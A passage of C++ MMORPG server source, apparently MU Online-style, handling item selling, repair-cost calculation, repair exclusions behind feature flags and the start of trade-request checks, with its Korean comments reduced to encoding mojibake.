				float  persent = 1.f - DurItem->m_Durability/DurItem->m_BaseDurability;
				sellmoney = DurItem->m_SellMoney * 0.6 * persent;

				if(sellmoney>= 1000)
					sellmoney = sellmoney/100*100;
				else if(sellmoney >= 100)
					sellmoney = sellmoney/10*10;
			}
			else
			{
				sellmoney = lpObj->pInventory[lpMsg->Pos].m_SellMoney;
			}
		}
		*/
		
#ifdef MODIFY_ZEN_MAX_20040414
		if( !gObjCheckMaxZen( aIndex, sellmoney ) )
		{
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
#endif
		lpObj->Money += sellmoney;
		pResult.Result = 1;
		pResult.Money = lpObj->Money;

		ItemIsBufExOption(NewOption, &lpObj->pInventory[lpMsg->Pos]);
		
		/*LogAddTD(lMsg.Get(485),
			lpObj->AccountID, 
			lpObj->Name,
			lpObj->Money, 
			lpObj->pInventory[lpMsg->Pos].GetName(),
			lpObj->pInventory[lpMsg->Pos].m_Level,
			lpObj->pInventory[lpMsg->Pos].m_Option1,
			lpObj->pInventory[lpMsg->Pos].m_Option2,
			lpObj->pInventory[lpMsg->Pos].m_Option3,
			lpObj->pInventory[lpMsg->Pos].m_Number		
			);
			*/

#ifdef EXTEND_LOG_SYSTEM_07_20070320
		LogAddTD(lMsg.Get(485),
			lpObj->AccountID, 
			lpObj->Name,
			tShop,		// ���� ��ȣ �߰�
			sellmoney, 
			lpObj->pInventory[lpMsg->Pos].GetName(),
			lpObj->pInventory[lpMsg->Pos].m_Level,
			lpObj->pInventory[lpMsg->Pos].m_Option1,
			lpObj->pInventory[lpMsg->Pos].m_Option2,
			lpObj->pInventory[lpMsg->Pos].m_Option3,
			lpObj->pInventory[lpMsg->Pos].m_Number,
			(int)lpObj->pInventory[lpMsg->Pos].m_Durability,
			NewOption[0],
			NewOption[1],
			NewOption[2],
			NewOption[3],
			NewOption[4],
			NewOption[5],
			NewOption[6],
			lpObj->pInventory[lpMsg->Pos].m_SetOption,
			lpObj->pInventory[lpMsg->Pos].m_ItemOptionEx>>7,										// 380 �ɼ�
			g_kJewelOfHarmonySystem.GetItemStrengthenOption( &lpObj->pInventory[lpMsg->Pos] ),		// ��ȭ�ɼ�
			g_kJewelOfHarmonySystem.GetItemOptionLevel( &lpObj->pInventory[lpMsg->Pos] )			// ��ȭ����
			);
#else
		LogAddTD(lMsg.Get(485),
			lpObj->AccountID, 
			lpObj->Name,
			tShop,		// ���� ��ȣ �߰�
			sellmoney, 
			lpObj->pInventory[lpMsg->Pos].GetName(),
			lpObj->pInventory[lpMsg->Pos].m_Level,
			lpObj->pInventory[lpMsg->Pos].m_Option1,
			lpObj->pInventory[lpMsg->Pos].m_Option2,
			lpObj->pInventory[lpMsg->Pos].m_Option3,
			lpObj->pInventory[lpMsg->Pos].m_Number,
			(int)lpObj->pInventory[lpMsg->Pos].m_Durability,
			NewOption[0],
			NewOption[1],
			NewOption[2],
			NewOption[3],
			NewOption[4],
			NewOption[5],
			NewOption[6],
			lpObj->pInventory[lpMsg->Pos].m_SetOption
			);
#endif // EXTEND_LOG_SYSTEM_07_20070320
				
		//lpObj->pInventory[lpMsg->Pos].Clear();
		gObjInventoryDeleteItem(aIndex, lpMsg->Pos);

		if( lpMsg->Pos == EQUIPMENT_RING_RIGHT || lpMsg->Pos == EQUIPMENT_RING_LEFT)
		{
			gObjUseSkill.SkillChangeUse(aIndex);			
		}
		gObjMakePreviewCharSet(aIndex);

	}
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}

int GetNeedMoneyItemDurRepaire(CItem *DurItem, int RequestPos)
{
	int iMoney = 0;

	int type = DurItem->m_Type;
	float ItemDurability = (float)DurItem->m_Durability;

	if( type == MAKE_ITEMNUM(13,10) )
		return 0;

	if( HasItemDurability(type) )
	{	// �������� ������ ������
		float Durability;
		float RepaireMoney = 0;	

		Durability = DurItem->m_BaseDurability;

		if( ItemDurability == Durability )
			return 0;

		//RepaireMoney = DurItem->m_SellMoney*GetRepairItemRate(type)/Durability;
		//RepaireMoney = RepaireMoney*(Durability-ItemDurability);

		float   persent = 1.f - (ItemDurability/Durability);

		int sellmoney;

#ifdef DARKLORD_WORK
		if( type == MAKE_ITEMNUM(13,4) || type == MAKE_ITEMNUM(13,5) )
		{	// ��ũ���Ǹ�, ��ũȣ�� �׾����� ���� ��� 2��
			sellmoney =  DurItem->m_BuyMoney;
		}
		else
#endif
		{
			sellmoney =  DurItem->m_BuyMoney/3;
		}
		
#ifdef MODIFY_ITEM_REPAIRE_MAXMONEY
		if( sellmoney > 400000000 )
		{
			sellmoney = 400000000;
		}
#endif

		if(sellmoney>= 1000)
			sellmoney = sellmoney/100*100;
		else if(sellmoney >= 100)
			sellmoney = sellmoney/10*10;

		float fRoot = ( float)sqrt( ( double)sellmoney);
		float fRootRoot = ( float)sqrt( sqrt( ( double)sellmoney));
		RepaireMoney = 3.f * fRoot * fRootRoot;

		RepaireMoney *= persent;
        RepaireMoney++;

		if( ItemDurability <= 0 )
		{	// ���� ������ ��� +�߰� ����� ���
#ifdef DARKLORD_WORK
			if( type == MAKE_ITEMNUM(13,4) || type == MAKE_ITEMNUM(13,5) )
			{	// ��ũ���Ǹ�, ��ũȣ�� �׾����� ���� ��� 2��
				RepaireMoney *= 2;
			}
			else
#endif
				RepaireMoney *= GetAllRepairItemRate(type);
		}

		if( RequestPos == 1 )
		{	// �κ����� �����ϸ� 5%�߰� ����� ���
			
#ifdef MODIFY_AUTOREPAIR_CALC_20090608
			RepaireMoney += RepaireMoney*1.5f;
#else
#ifdef UPDATE_INVEN_REPAIREMONEY_INC_20081112	// ������� 3��
			RepaireMoney += RepaireMoney*2.0f;
#else	// UPDATE_INVEN_REPAIREMONEY_INC_20081112
			RepaireMoney += RepaireMoney*0.05f;
#endif	// UPDATE_INVEN_REPAIREMONEY_INC_20081112
#endif //MODIFY_AUTOREPAIR_CALC_20090608

#ifdef REPAIR_ITEM_CHANGE	// �κ������� ������ 100%�λ�			
			if( DurItem->m_Type >= MAKE_ITEMNUM(12,0) && DurItem->m_Type <= MAKE_ITEMNUM(12,6) )
			{	// ������ �߰��� 500%
				RepaireMoney *= 5.f;

			}
			else
			{
				RepaireMoney += RepaireMoney;
			}
#endif
		}
#ifdef REPAIR_ITEM_CHANGE
		else
		{	
			if( DurItem->m_Type >= MAKE_ITEMNUM(12,0) && DurItem->m_Type <= MAKE_ITEMNUM(12,6) )
			{	// ������ �߰��� 200%
				RepaireMoney *= 2.f;
			}
			else
			{
				RepaireMoney -= RepaireMoney*0.4f;
			}
		}
#endif

		iMoney = (int)RepaireMoney;

		if( iMoney >= 1000 )
		{
			iMoney = iMoney/100*100;
		}
#ifdef	MODIFY_CALREPAIRRATE_20090528
		else if( iMoney > 100 )
#else
		else if( iMoney > 10 )
#endif
		{
			iMoney = iMoney/10*10;
		}
	}
	else
	{
		iMoney = -1;
	}	
	return iMoney;
}


// Ư���� �������� �������� ��ģ��.
void ItemDurRepaire(LPOBJECTSTRUCT lpObj, CItem *DurItem, int pos, int RequestPos)
{	
	PMSG_ITEMDURREPAIR_RESULT pResult;
	DWORD result=1;
	
	PHeadSetB((LPBYTE)&pResult, 0x34, sizeof( pResult));

	int itemtype = DurItem->m_Type;

#ifdef DARKLORD_WORK
#ifndef UPDATE_DARKROAD_PET_ITEMREPAIR_20090109	// �κ������� ���������ϵ��� ����
	if( lpObj->m_IfState.type  != I_DARK_TRAINER )
	{
		if( itemtype == MAKE_ITEMNUM(13,4) || itemtype == MAKE_ITEMNUM(13,5) )
		{	// ���û� â�� ���� �ʰ� ������ ��û�ϸ� ���� ���� �ʴ´�
			pResult.Money = 0;
			DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}
#endif	// UPDATE_DARKROAD_PET_ITEMREPAIR_20090109
#endif

	if( itemtype >= ITEM_POTION ||		// ����� && ������ 
		itemtype >= ITEM_HELPER && itemtype < ITEM_HELPER+4 ||
		itemtype == MAKE_ITEMNUM(13,10)  || // ���� ����
#ifdef	ADD_THIRD_WING_20070525	// 3������ ����
		( itemtype >= ITEM_WING + 7 && itemtype < ITEM_WING + 36 ) ||
#ifdef ADD_SUMMONER_SECOND_THIRD_WING_20071130	// �ű�ĳ���� ����� ����, ������ ����, ������ ���� ����
		( itemtype > ITEM_WING + 43 && itemtype < ITEM_HELPER ) || 
#else
		( itemtype > ITEM_WING + 40 && itemtype < ITEM_HELPER ) || 
#endif
#else
		itemtype >= ITEM_WING+7 && itemtype < ITEM_HELPER || 
#endif
		itemtype == MAKE_ITEMNUM(4,7) || 
		itemtype == MAKE_ITEMNUM(4,15) )	// ȭ��/ ����..
	{
		pResult.Money = 0;
		DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
	
#ifdef KANTURU_MOONSTONEPENDANT_20060804		// ���������Ʈ�� ������ �� ����.
	if( itemtype == MAKE_ITEMNUM( 13,38 ) )
	{	
		pResult.Money = 0;
		DataSend(lpObj->m_Index, ( LPBYTE )&pResult, pResult.h.size );
		return;			
	}
#endif

#ifdef ADD_ELITE_SKELETON_WORRIOR_CHANGE_RING_20060830	// ���� �ȵ�
	if( itemtype == MAKE_ITEMNUM( 13, 39 ) )
	{	
		pResult.Money = 0;
		DataSend( lpObj->m_Index, ( LPBYTE )&pResult, pResult.h.size );
		return;			
	}
#endif
	
#ifdef HALLOWINDAY_JACK_O_LANTERN_MORPH_RING_20061017
	if( itemtype == MAKE_ITEMNUM( 13, 40 ) )
	{
		pResult.Money = 0;
		DataSend( lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size );
		return;
	}
#endif // HALLOWINDAY_JACK_O_LANTERN_MORPH_RING_20061017
	
#ifdef CHRISTMAS_SANTA_POLYMORPH_RING_20061117
	if( itemtype == MAKE_ITEMNUM( 13, 41 ) )
	{
		pResult.Money = 0;
		DataSend( lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size );
	}
#endif // CHRISTMAS_SANTA_POLYMORPH_RING_20061117

#ifdef UPDATE_GM_FUNCTION_20070228
	if( itemtype == MAKE_ITEMNUM( 13, 42 ) )
	{
		pResult.Money = 0;
		DataSend( lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size );
	}
#endif

	pResult.Money = GetNeedMoneyItemDurRepaire(DurItem, RequestPos);

	if( pResult.Money <= 0 )
	{	// ���� �Ҽ� ���� �������̴�
		pResult.Money = 0;
		DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
		return;
	}	

	// ���� �ֳ� �˻��Ѵ�.
#ifdef MODIFY_ITEM_REPAIR_HIRE_BUGFIX_20090415
	if( lpObj->Money-pResult.Money < 0 ) 
#else // MODIFY_ITEM_REPAIR_HIRE_BUGFIX_20090415
	if( lpObj->Money-pResult.Money < 1 ) 
#endif // MODIFY_ITEM_REPAIR_HIRE_BUGFIX_20090415
	{
		//���� ������ ���� 
		pResult.Money = 0;
	}
	else {
		// ���� �ִٸ� ���� ���ҽ�Ű�� �������� ȸ����Ų��.
		lpObj->Money -= pResult.Money;
		pResult.Money = lpObj->Money;

#ifdef MODIFY_ITEM_REPAIR_HIRE_BUGFIX_20090415
		GCMoneySend( lpObj->m_Index, lpObj->Money );
#endif // MODIFY_ITEM_REPAIR_HIRE_BUGFIX_20090415
				
		DurItem->m_Durability = (int)DurItem->m_BaseDurability;

		// ������ �ɷ�ġ�� �����Ѵ�

#ifdef ADD_380ITEM_NEWOPTION_20060711
		DurItem->Convert(DurItem->m_Type, 
		                 DurItem->m_Option1, 
						 DurItem->m_Option2,
						 DurItem->m_Option3,
						 DurItem->m_NewOption,
						 DurItem->m_SetOption,
						 DurItem->m_ItemOptionEx);	
#else
		DurItem->Convert(DurItem->m_Type, 
		                 DurItem->m_Option1, 
						 DurItem->m_Option2,
						 DurItem->m_Option3,
						 DurItem->m_NewOption,
						 DurItem->m_SetOption);	
#endif // ADD_380ITEM_NEWOPTION_20060711

#ifdef UPDATE_DARKROAD_PET_ITEMREPAIR_20090109
		if(DurItem->m_Type == MAKE_ITEMNUM(13,4) || DurItem->m_Type == MAKE_ITEMNUM(13,5))
		{
			DurItem->PetValue();		
		}
#endif	// UPDATE_DARKROAD_PET_ITEMREPAIR_20090109
		
		// �������� ���� �����ְ�
		GCItemDurSend(lpObj->m_Index, pos, DurItem->m_Durability, 0);
	}

	// ��� �� ���� ������.
	DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
}

// [0x34] �������� ������ ������ ��û�Ѵ�.
void CGModifyRequestItem(LPPMSG_ITEMDURREPAIR lpMsg, int aIndex)
{
	LPOBJECTSTRUCT lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];
	PMSG_ITEMDURREPAIR_RESULT pResult;
	
	PHeadSetB((LPBYTE)&pResult, 0x34, sizeof( pResult));	

	pResult.Money = 0;

	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
	/*// �ڽ��� ��û�ϰų� �ŷ��� �϶� �ȱ� �ȵǰ� ����
	if( lpObj->m_IfState.use > 0 )
	{
		if( lpObj->m_IfState.type != I_SHOP )
		{
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}		
	}*/
	if( PacketCheckTime(lpObj) == FALSE ) {
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if( lpMsg->Requestpos == 1 && gObj[aIndex].Level < 50 )
	{	// �κ��丮���� ������û�� �ߴµ� ���� 50���ϸ� �����Ҽ� ����
		//LogAdd("[%s][%s] ������ 50�����ε� ������û�� �ߴ�", gObj[aIndex].AccountID, gObj[aIndex].Name);
		pResult.Money = 0;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
	
	if( lpMsg->Position == 255 )
	{	// ��ü ���� ��û
		for( int n=0; n<MAX_INVENTORY; n++)
		{
			if( lpObj->pInventory[n].IsItem() )
			{
#ifdef ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
				// ĳ�� �������� ���� ��󿡼� ����
				if( IsCashItem( lpObj->pInventory[n].m_Type ) == TRUE )
				{
					continue;
				}
#endif // ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
#ifdef PREMIUMITEM_20090106
				// �����̾� �������� ���� ��󿡼� ����
				if(	IsPremiumItem( lpObj->pInventory[n].m_Type ) == TRUE )
				{
					continue;
				}
#endif // PREMIUMITEM_20090106
#ifndef FOR_KOREA
	#ifdef ADD_PREMIUMITEM_PANDA
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM( 13, 76)	// �Ҵ����Ź���
					|| lpObj->pInventory[n].m_Type == MAKE_ITEMNUM( 13, 80)	// �Ҵ���
					)
				{	// �Ҵ� �����۵��� ������ �� ����.
					continue;
				}
	#endif // ADD_PREMIUMITEM_PANDA
#endif // NOT_FOR_KOREA
#ifdef RING_EVENT_ITEMBOX_20031124			// �����̺�Ʈ - ���� ���� (��ü ���� ��)
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13,20) &&
					(lpObj->pInventory[n].m_Level == 0	||	// �������� ����
					 lpObj->pInventory[n].m_Level == 1		// ������ ����
					))
				{	// �̺�Ʈ �������� ������ �� ����.
					continue;
				}
#endif
#ifdef FRIENDSHIP_EVENT_RING_BOX_20040211	// �� ģ�� �̺�Ʈ - ������ ������ ������ �� �� ����
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13,20) &&
					lpObj->pInventory[n].m_Level == 2		// ������ ����
					)
				{	// �̺�Ʈ �������� ������ �� ����.
					continue;
				}
#endif
#ifdef MU_CHN_THANKS_RING_EVENT_20040908	// �߱� �̺�Ʈ - ������ ���� 
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13,20) &&
					lpObj->pInventory[n].m_Level == 3		// ������ ����
					)
				{	// �̺�Ʈ �������� ������ �� ����.
					continue;
				}
#endif
#ifdef DARKLORD_WORK
#ifndef UPDATE_DARKROAD_PET_ITEMREPAIR_20090109	
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13,4) || lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13,5) )
				{	// ��ũ���Ǹ�, ��ũȣ���� ��ü ���� ��󿡼� ����
					continue;
				}
#endif	// UPDATE_DARKROAD_PET_ITEMREPAIR_20090109
#endif
#ifdef MODIFY_FENRIR_ZEN_REPAIR_20060124
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13,37) )
				{
					// �渱�� ��ü ������󿡼� ����
					continue;
				}
#endif
#ifdef KANTURU_MOONSTONEPENDANT_20060804	
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM( 13,38 ) )
				{	// ���������Ʈ�� ��ü ������󿡼� ����
					continue;
				}
#endif
#ifdef ADD_ELITE_SKELETON_WORRIOR_CHANGE_RING_20060830	// ��ü ���� �ȵ�
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM( 13, 39 ) )
				{
					continue;
				}
#endif
#ifdef HIDDEN_TREASUREBOX_EVENT_20050804	// ������ ���� �̺�Ʈ �ø���� ��ü���� ��󿡼� ����
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(12,26) &&
					(lpObj->pInventory[n].m_Level == 1 ||	// ��������
					lpObj->pInventory[n].m_Level == 2 ||	// Ǫ������
					lpObj->pInventory[n].m_Level == 3 ||	// ��������
					lpObj->pInventory[n].m_Level == 4 ||	// ������ ����
					lpObj->pInventory[n].m_Level == 5		// ��¦���� (�������� ��ǰ)
					))
				{
					continue;
				}
#endif

#ifdef HALLOWINDAY_JACK_O_LANTERN_MORPH_RING_20061017
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM( 13, 40 ) )	// �� �� ������ ���Ź����� ���� �Ұ�
				{
					continue;
				}
#endif // HALLOWINDAY_JACK_O_LANTERN_MORPH_RING_20061017


#ifdef CHRISTMAS_SANTA_POLYMORPH_RING_20061117
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM( 13, 41 ) ) // ��Ÿũ�ν� ���Ź����� ���� �Ұ�
				{
					continue;
				}
#endif // CHRISTMAS_SANTA_POLYMORPH_RING_20061117

#ifdef UPDATE_GM_FUNCTION_20070228
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM( 13, 42 ) ) // GM ���Ź����� ���� �Ұ�
				{
					continue;
				}
#endif 

#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_1_20070723	// ���� �η縶���� �����Ұ�
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13, 51) )
				{
					// ���� �η縶���� ���� �Ұ�
					continue;
				}
#endif

//------------->
//20080930 �ؿ� 5�� �κ�����ȭ ��Ȱ, �̵� ���� (grooving)
#ifdef ADD_TELEPORT_CHARM_ITEM_20080930
				if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM(13, 70) )
				{
					// �̵��� ���� ���� �Ұ�
					continue;
				}
#endif
//<-------------

#ifdef MODIFY_SANTACLAUSVILLAGE_INVITATION
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13, 66) )
				{
					// ��Ÿ�� ���� ����� ���� �Ұ�
					continue;
				}
#endif // MODIFY_SANTACLAUSVILLAGE_INVITATION

#ifdef MODIFY_XMASEVENTITEM_REPAIR
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13, 67) || lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13, 68) )
				{
					// �絹����, ����� ���Ź��� ��ü���� �Ұ�
					continue;
				}
#endif // MODIFY_XMASEVENTITEM_REPAIR
				
#ifdef ADD_UNICORN_PET_20090915
				if( lpObj->pInventory[n].m_Type == MAKE_ITEMNUM(13, 106)
					)
				{
					// ������ ���� ��ü���� �Ұ�
					continue;
				}
#endif // ADD_UNICORN_PET_20090915
				
				ItemDurRepaire(lpObj, &lpObj->pInventory[n], n, lpMsg->Requestpos);				
			}
		}
		gObjCalCharacter(lpObj->m_Index);
	}
	else if( lpMsg->Position > MAX_INVENTORY-1 ) 
	{		
		pResult.Money = 0;
	}
	else 
	{
#ifdef ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
		if( IsCashItem( lpObj->pInventory[lpMsg->Position].m_Type ) == TRUE )
		{
			return;
		}
#endif // ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
#ifdef PREMIUMITEM_20090106
		// �����̾� �������� ��ü���� ��󿡼� ����
		if(	IsPremiumItem( lpObj->pInventory[lpMsg->Position].m_Type ) == TRUE )
		{
			return;
		}
#endif // PREMIUMITEM_20090106
#ifndef FOR_KOREA
	#ifdef ADD_PREMIUMITEM_PANDA
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM( 13, 76)		// �Ҵ����Ź���
			|| lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM( 13, 80)	// �Ҵ���
			)
		{	// �Ҵ� �����۵��� ������ �� ����.
			return;
		}
	#endif // ADD_PREMIUMITEM_PANDA
#endif // NOT_FOR_KOREA
#ifdef RING_EVENT_ITEMBOX_20031124			// �����̺�Ʈ - ���� ����
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM(13,20) &&
			(lpObj->pInventory[lpMsg->Position].m_Level == 0	||	// �������� ����
			 lpObj->pInventory[lpMsg->Position].m_Level == 1		// ������ ����
			))
		{	// �̺�Ʈ �������� ������ �� ����.
			return;
		}
#endif
#ifdef FRIENDSHIP_EVENT_RING_BOX_20040211	// �� ģ�� �̺�Ʈ - ������ ������ ������ �� �� ����
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM(13,20) &&
			lpObj->pInventory[lpMsg->Position].m_Level == 2			// ������ ����
			)
		{	// �̺�Ʈ �������� ������ �� ����.
			return;
		}
#endif
#ifdef MU_CHN_THANKS_RING_EVENT_20040908	// �߱� �̺�Ʈ - ������ ���� 
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM(13,20) &&
			lpObj->pInventory[lpMsg->Position].m_Level == 2			// ������ ����
			)
		{	// ���� �������� ������ �� ����.
			return;
		}
#endif
#ifdef MODIFY_FENRIR_ZEN_REPAIR_20060124
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM(13,37) )
		{	// �渱�� ������ �� ����.
			return;
		}
#endif
#ifdef KANTURU_MOONSTONEPENDANT_20060804	
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM( 13,38 ) )
		{	// ���������Ʈ�� ������ �� ����.
			return;
		}
#endif		
		
#ifdef HALLOWINDAY_JACK_O_LANTERN_MORPH_RING_20061017
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM( 13, 40 ) )
		{
			// �� �� ���� ���Ź����� ���� �Ұ�
			return;
		}
#endif // HALLOWINDAY_JACK_O_LANTERN_MORPH_RING_20061017


#ifdef CHRISTMAS_SANTA_POLYMORPH_RING_20061117
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM( 13, 41 ) )
		{
			// ��Ÿũ�ν� ���Ź����� ���� �Ұ�
			return;
		}
#endif // CHRISTMAS_SANTA_POLYMORPH_RING_20061117

#ifdef UPDATE_GM_FUNCTION_20070228
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM( 13, 42 ) ) 
		{
			// GM ���Ź����� ���� �Ұ�
			return;
		}
#endif 

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ���� �η縶���� �����Ұ�
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM(13, 51) )
		{
			// ���� �η縶���� ���� �Ұ�
			return;
		}
#endif
//------------->
//20080930 �ؿ� 5�� �κ�����ȭ ��Ȱ, �̵� ���� (grooving)
#ifdef ADD_TELEPORT_CHARM_ITEM_20080930
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM(13, 70) )
		{
			// �̵��� ���� ���� �Ұ�
			return;
		}
#endif
//<-------------
#ifdef MODIFY_SANTACLAUSVILLAGE_INVITATION
		if( lpObj->pInventory[lpMsg->Position].m_Type == MAKE_ITEMNUM(13, 66) )
		{
			// ��Ÿ�� ���� ����� ���� �Ұ�
			return;
		}
#endif // MODIFY_SANTACLAUSVILLAGE_INVITATION

		ItemDurRepaire(lpObj, &lpObj->pInventory[lpMsg->Position], lpMsg->Position, lpMsg->Requestpos);
		gObjCalCharacter(lpObj->m_Index);
	}		
}


//----------------------------------------------------------------------------
// [0x36] ���� ��ȯ�� �ٸ� ������� ��û�Ѵ�.
void CGTradeRequestSend(LPPMSG_TRADE_REQUEST lpMsg, int aIndex)
{
	int number;
	
	// �ŷ������ ��� �ߴܵǾ��ٸ�.
	if( bCanTrade == FALSE )
	{
		GCServerMsgStringSend(lMsg.Get(1149), aIndex, 1);	// ��� �ŷ������ ����Ͻ� �� �����ϴ�
		GCServerMsgStringSend(lMsg.Get(1150), aIndex, 1);	// �� �ŷ��� �����ϵ��� �ϰڽ��ϴ�
		return;
	}

	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return;
	}

	LPOBJECTSTRUCT lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];
	if( PacketCheckTime(lpObj) == FALSE ) return;

	number = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	
	if( !CHECK_LIMIT(number, MAX_OBJECT) )
	{
		LogAdd("error : %s %d (%d)",__FILE__, __LINE__, number);
		return;
	}

	// �ڽ����� �ŷ��� ��û�� �� ����.
	if( number == aIndex ) return;
	
	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(number) == FALSE ) return;
	if( gObj[number].Type == OBJTYPE_MONSTER ) return;
	if( gObj[number].CloseCount >= 0 ) return;
	if( lpObj->DieRegen > 0 || gObj[number].DieRegen > 0 ) return;

#ifdef MODIFY_REQUESTNPC_HACK
	if (gObj[number].Type != OBJTYPE_CHARACTER)
	{
		LogAddC(LOGC_RED,"[HACKTOOL] : NPC-TradeRequest npc:%d ip:%s account:%s name:%s State:%d", 
			gObj[number].Class, 
			gObj[aIndex].Ip_addr,
			gObj[aIndex].AccountID, 
			gObj[aIndex].Name, 
			gObj[aIndex].Connected);
		
		CloseClient(aIndex);
		return;
	}
#endif // MODIFY_REQUESTNPC_HACK

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsDuel(gObj[aIndex]) || g_NewPVP.IsDuel(gObj[number]) )
	{
		// "�����߿��� �ŷ��� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3422), aIndex, 1);
		return;
	}

	if ( g_NewPVP.IsObserver(gObj[aIndex]) )
	{
		// "�����߿��� �ŷ��� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3423), aIndex, 1);
		return;
	}
#endif // ADD_NEWPVP_PKFIELD

	if( gObj[number].m_stateEngagePVP == PVP_USER_PLAYING )
	{
		GCServerMsgStringSend("[PVP Event] Accion no permitida", aIndex, 1);
		return;
	}

#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� �ʹ�ȣ üũ ����
	if( CHECK_DEVILSQUARE(gObj[number].MapNumber) )
#else
	if( gObj[number].MapNumber == 9 )
#endif
	{	// ���忡���� �ŷ��� �Ҽ� ����
		GCServerMsgStringSend(lMsg.Get(711), aIndex, 1);
		return;
	}
	
#ifdef PERSONAL_SHOP_20040113		// �ڽ��̳� ������ ���λ����� �������̸� �ŷ��� �� �� ����.
	if (gObj[aIndex].m_bPShopOpen == true)
		return;
	if (gObj[number].m_bPShopOpen == true)
		return;
#endif

#ifdef CHAOSCASTLE_SYSTEM_20040408	// ī���� ĳ�� �ȿ����� �ŷ��� �� �� ����.
	if (CHECK_CHAOSCASTLE(gObj[number].MapNumber)) {
		GCServerMsgStringSend(lMsg.Get(1220), aIndex, 1);		// "ī���� ĳ�� �ȿ����� �ŷ��� �� �� �����ϴ�."
		return;
	}
#endif
	
#ifdef FOR_BLOODCASTLE
	if (CHECK_BLOODCASTLE(gObj[aIndex].MapNumber)) {			// ���� ĳ�� �ȿ� �ִٸ� �ŷ��� �� �� ����.
#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// ����ĳ�� �ٸ� �ε��� ����
		int iBridgeIndex = g_BloodCastle.GetBridgeIndexByMapNum( gObj[aIndex].MapNumber );
		if (
			(g_BloodCastle.GetCurrentState( iBridgeIndex ) != BLOODCASTLE_STATE_CLOSED) ||	// ������̰ų� ���������� �ƴ϶�� �ŷ��� ���Ѵ�.
			(!g_BloodCastle.CheckCanEnter( iBridgeIndex ) )
			)
#else
		if (
			(g_BloodCastle.GetCurrentState(gObj[aIndex].MapNumber - MAP_INDEX_BLOODCASTLE1) != BLOODCASTLE_STATE_CLOSED) ||	// ������̰ų� ���������� �ƴ϶�� �ŷ��� ���Ѵ�.
			(!g_BloodCastle.CheckCanEnter(gObj[aIndex].MapNumber - MAP_INDEX_BLOODCASTLE1))
			)
#endif	// ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010
		{
			GCServerMsgStringSend(lMsg.Get(1212), aIndex, 1);	// "���� ĳ�� �ȿ����� �ŷ��� �� �� �����ϴ�."
			return;
		}
	}
#endif

#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_2_20070724	// ����ȿ����� �ŷ��� �� ����
	if(CHECK_ILLUSION_TEMPLE(gObj[aIndex].MapNumber))
	{
#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_6_200708013	// wtf ���� ������Ʈ
		GCServerMsgStringSend(lMsg.Get(3396), aIndex, 1);	// "ȯ����� �ȿ����� �ŷ��� �� �� �����ϴ�."
#else
